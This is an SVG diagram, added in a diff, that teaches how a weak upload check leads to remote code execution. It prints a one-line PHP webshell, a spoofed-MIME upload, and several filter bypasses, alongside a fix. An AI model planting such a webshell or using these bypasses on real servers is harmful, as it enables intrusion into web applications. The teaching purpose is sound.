@@ -1,0 +1,62 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400" font-family="'Chakra Petch','Segoe UI',Arial,sans-serif">
+  <rect x="0" y="0" width="800" height="400" rx="12" fill="#0d121d" stroke="#263451"/>
+  <text x="400" y="34" text-anchor="middle" font-size="17" font-weight="700" fill="#e3fffa">File upload to RCE via a webshell</text>
+  <text x="400" y="56" text-anchor="middle" font-size="12" fill="#6c7b93" font-family="'JetBrains Mono',monospace">three links must line up: stored, executable, reachable</text>
+
+  <defs>
+    <marker id="a" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#6c7b93"/>
+    </marker>
+  </defs>
+
+  <!-- step 1 upload -->
+  <g text-anchor="middle" font-size="11.5">
+    <rect x="24" y="110" width="176" height="86" rx="7" fill="#0b1518" stroke="#00f0ff" stroke-dasharray="5 4"/>
+    <text x="112" y="134" fill="#e3fffa" font-size="12">1. Upload</text>
+    <text x="112" y="155" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">file=@shell.php</text>
+    <text x="112" y="172" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">;type=image/jpeg</text>
+    <text x="112" y="189" fill="#6c7b93" font-size="10">fake MIME set by client</text>
+  </g>
+
+  <!-- step 2 weak check -->
+  <g text-anchor="middle" font-size="11.5">
+    <rect x="232" y="110" width="176" height="86" rx="7" fill="#111827" stroke="#ff2a6d"/>
+    <text x="320" y="134" fill="#ff2a6d" font-weight="700" font-size="12">2. Weak check</text>
+    <text x="320" y="155" fill="#9fb0c8" font-size="10.5">trusts Content-Type</text>
+    <text x="320" y="172" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="9.5">strpos(type,'image/')===0</text>
+    <text x="320" y="189" fill="#6c7b93" font-size="10">value is attacker-set</text>
+  </g>
+
+  <!-- step 3 stored -->
+  <g text-anchor="middle" font-size="11.5">
+    <rect x="440" y="110" width="176" height="86" rx="7" fill="#111827" stroke="#263451"/>
+    <text x="528" y="134" fill="#e3fffa" font-size="12">3. Stored in webroot</text>
+    <text x="528" y="155" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="10">/uploads/shell.php</text>
+    <text x="528" y="172" fill="#9fb0c8" font-size="10.5">PHP handler is on</text>
+    <text x="528" y="189" fill="#6c7b93" font-size="10">and the path is known</text>
+  </g>
+
+  <!-- step 4 rce -->
+  <g text-anchor="middle" font-size="11.5">
+    <rect x="648" y="110" width="128" height="86" rx="7" fill="#111827" stroke="#fcee0a"/>
+    <text x="712" y="134" fill="#e3fffa" font-size="12">4. RCE</text>
+    <text x="712" y="155" fill="#9fb0c8" font-family="'JetBrains Mono',monospace" font-size="9.5">?cmd=id</text>
+    <text x="712" y="174" fill="#fcee0a" font-size="10">uid=33(www-data)</text>
+  </g>
+
+  <g stroke="#6c7b93" stroke-width="2" marker-end="url(#a)" fill="none">
+    <line x1="200" y1="153" x2="228" y2="153"/>
+    <line x1="408" y1="153" x2="436" y2="153"/>
+    <line x1="616" y1="153" x2="644" y2="153"/>
+  </g>
+
+  <!-- webshell -->
+  <g font-size="12" font-family="'JetBrains Mono',monospace">
+    <rect x="200" y="238" width="400" height="48" rx="7" fill="#0b1518" stroke="#fcee0a"/>
+    <text x="400" y="267" text-anchor="middle" fill="#fcee0a">&lt;?php system($_GET["cmd"]); ?&gt;</text>
+  </g>
+  <text x="400" y="310" text-anchor="middle" font-size="11" fill="#9fb0c8">A one-line webshell runs any command as the web-server user.</text>
+
+  <text x="400" y="352" text-anchor="middle" font-size="11" fill="#6c7b93">Fix: verify server-side with an extension allowlist, rename the file, and store outside the webroot or disable script execution there.</text>
+  <text x="400" y="376" text-anchor="middle" font-size="11" fill="#6c7b93">Also bypassed by double extension shell.php.jpg, magic bytes GIF89a;&lt;?php...?&gt;, and .phtml / .htaccess.</text>
+</svg>
